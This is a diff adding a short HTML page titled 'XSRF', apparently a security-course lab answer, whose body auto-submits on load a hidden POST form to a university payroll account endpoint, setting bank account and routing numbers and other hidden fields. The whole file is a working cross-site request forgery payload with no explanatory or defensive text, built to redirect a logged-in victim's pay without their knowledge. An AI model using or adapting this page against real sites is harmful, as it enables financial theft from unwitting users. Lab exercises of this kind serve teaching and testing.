@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSRF</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form id="form" action="http://payroll.gatech.edu/account.php?varId=42" method="POST">
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="account" value="3585727265" />
+      <input type="hidden" name="routing" value="2485789437" />
+      <input type="hidden" name="challenge" value="" />
+      <input type="hidden" name="response" value="36204" />
+      <input type="hidden" name="RmFsbDIwMTlUYXJnZXQxRWFzdGVyRWdnLU5vT25lV2lsbEtub3c9KQ0K" value="RmFsbDIwMTlUYXJnZXQxRWFzdGVyRWdnLU5vT25lV2lsbEtub3c9KQ0K" />
+    </form>
+  </body>
+</html>
+
